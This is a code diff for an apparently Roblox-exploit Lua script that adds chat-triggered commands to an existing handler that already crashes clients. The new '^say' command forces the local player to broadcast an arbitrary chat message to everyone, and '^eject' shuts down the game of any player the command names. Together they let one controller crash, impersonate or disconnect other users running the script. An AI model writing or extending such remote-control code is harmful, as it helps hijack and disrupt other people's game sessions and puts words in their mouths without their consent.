@@ -67,6 +67,21 @@ local function updbd()
                         end
                     elseif args[1] == "^crash" then
                         repeat until false
+                    elseif args[1] == "^say" then
+                        local args = {
+                            [1] = tostring(table.concat(args, " ", 3)),
+                            [2] = "All"
+                        }
+
+                        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild(
+                            "SayMessageRequest"
+                        ):FireServer(unpack(args))
+                    elseif args[1] == "^eject" then
+                        for i,v in pairs(getplr(args[2])) do
+                            if v == game.Players.LocalPlayer then
+                                game:Shutdown()
+                            end
+                        end
                     end
                 end
             )
